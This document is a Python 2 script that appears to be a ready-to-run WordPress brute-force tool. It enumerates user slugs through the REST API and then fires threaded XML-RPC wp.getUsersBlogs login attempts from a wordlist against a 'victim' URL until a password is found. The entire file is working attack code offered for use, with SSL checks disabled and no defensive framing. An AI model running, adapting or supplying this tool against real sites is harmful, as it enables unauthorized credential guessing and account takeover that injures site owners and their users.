#!/usr/bin/env python
#
# Requirements:
#
# 1) python's httplib2 lib
#    Installation: pip install httplib2

import urllib3, httplib, httplib2
import socket, sys, os, os.path, argparse, random
from threading import Thread
from time import sleep
import requests
import re

UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'


def urlCMS(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('\n[X] You must insert http:// or https:// procotol')
        os._exit(1)
    url = url + '/xmlrpc.php'
    return url


def bodyCMS(user, pwd):
    body = """<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName>
         <params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (
        user, pwd)
    return body


def headersCMS(UA, lenbody, ):
    headers = {'User-Agent': UA,
               'Content-type': 'text/xml',
               'Content-Length': "%d" % len(lenbody)}
    return headers


def responseCMS(response):
    if response['set-cookie'].split(" ")[-1] == "httponly":
        return "1"


def connection(url, user, password, UA, ):
    pwd = password
    http = httplib2.Http(disable_ssl_certificate_validation=True)
    # HTTP POST Data
    body = bodyCMS(user, pwd)
    # Headers
    headers = headersCMS(UA, body)
    try:
        response, content = http.request(url, 'POST', headers=headers, body=body)
        if str(response.status)[0] == "4" or str(response.status)[0] == "5":
            print('[X] HTTP error, code: ' + str(response.status))
            os._exit(1)
        # Remove all blank and newline chars
        xmlcontent = content.replace(" ", "").replace("\n", "")
        if not "faultCode" in xmlcontent:
            print('\n')
            print('[!] Password FOUND!!!')
            print('')
            print('[!] Username: ' + user + ' Password: ' + password)
            os._exit(0)
        checkCon = "OK"
        return checkCon

    except socket.timeout:
        print('\n[X] Connection Timeout')
        os._exit(1)
    except socket.error:
        print('\n[X] Connection Refused')
        os._exit(1)
    except httplib.ResponseNotReady:
        print('\n[X] Server Not Responding')
        os._exit(1)
    except httplib2.ServerNotFoundError:
        print('\n[X] Server Not Found')
        os._exit(1)
    except httplib2.HttpLib2Error:
        print('\n[X] Connection Error!!')
        os._exit(1)


def blocks(files, size=65536):
    while True:
        b = files.read(size)
        if not b: break
        yield b


commandList = argparse.ArgumentParser(sys.argv[0])
commandList.add_argument('-S', '--standard',
                         action="store_true",
                         dest="standard",
                         help="Standard login brute",
                         )
commandList.add_argument('-t', '--target',
                         action="store",
                         dest="target",
                         help="Insert URL: http[s]://www.victimurl.com[:port]",
                         )
commandList.add_argument('-w', '--wordfilelist',
                         action="store",
                         dest="wordfilelist",
                         help="Insert wordlist file",
                         )

options = commandList.parse_args()

# Check args

if not options.target or not options.wordfilelist:
    commandList.print_help()
    sys.exit(1)

# args to vars
url = options.target
wlfile = options.wordfilelist

# Check if Wordlist file exists and has readable
if not os.path.isfile(wlfile) and not os.access(wlfile, os.R_OK):
    print("[X] Wordlist file is missing or is not readable")
    sys.exit(1)

# Url to url+login_cms_page
url = urlCMS(url)

wlsize = os.path.getsize(wlfile) >> 20
if wlsize < 100:
    with open(wlfile) as f:
        totalwordlist = sum(bl.count("\n") for bl in blocks(f))
else:
    totalwordlist = "unknown"

res = requests.get(url)
stat = res.status_code
user_list = []
if stat == 405:
    print('[+] XML-RPC - Interface available at ' + url)
    print('Geting users')
    try:
        users_url = re.sub(r'(.*://)?([^/?]+).*', '\g<1>\g<2>' + "/wp-json/wp/v2/users", url)
        print(users_url)
        req = requests.get(users_url)
        if req.status_code == 200:
            response = req.json()
            for value in response:
                print('*' * 40)
                user_login = value['slug']
                user_list.append(user_login)
                user_list.append('test')
            print('Please, select user by number')
            for item in user_list:
                print user_list.index(item), str(item)
            while True:
                try:
                    x = int(input())
                    if -1 < x <= len(user_list):
                        user = user_list[x]
                        break
                    else:
                        print('Please, select user by number')
                        pass
                except:
                    print('Please, select user by number')
                    continue
            print('Selected user is \"' + user_list[x] + '\"')
    except Exception:
        print('Can\'t get users list, using default word admin')
        user = 'admin'
elif stat == 403:
    print('[-] XML-RPC - Access id denied, exit...')
    exit()
elif stat == 404:
    print('[-] XML-RPC - Does not exist, exit...')
    exit()
else:
    print('[-] XML-RPC - Interfece not available at ' + url)

print('[+] Target.....: ' + options.target)
print('[+] Wordlist...: ' + str(totalwordlist))
print('[+] Username...: ' + user)
print('[+] BruteMode..: Xml-Rpc')
print('[+] Connecting.......')

# Check connection with fake-login
if connection(url, user, UA, UA) == "OK":
    print('[+] Connection established')

# Reset var for "progress bar"
count = 0

threads = []

with open(wlfile) as wordlist:
    for pwd in wordlist:
        count += 1
        t = Thread(target=connection, args=(url, user, pwd, UA))
        t.start()
        threads.append(t)
        sys.stdout.write('\r')
        sys.stdout.write('[+] Password checked: ' + str(count) + '/' + str(totalwordlist))
        sys.stdout.flush()
        sleep(0.210)

for a in threads:
    a.join()

# no passwords found
print('\n[X] Password NOT found :(')
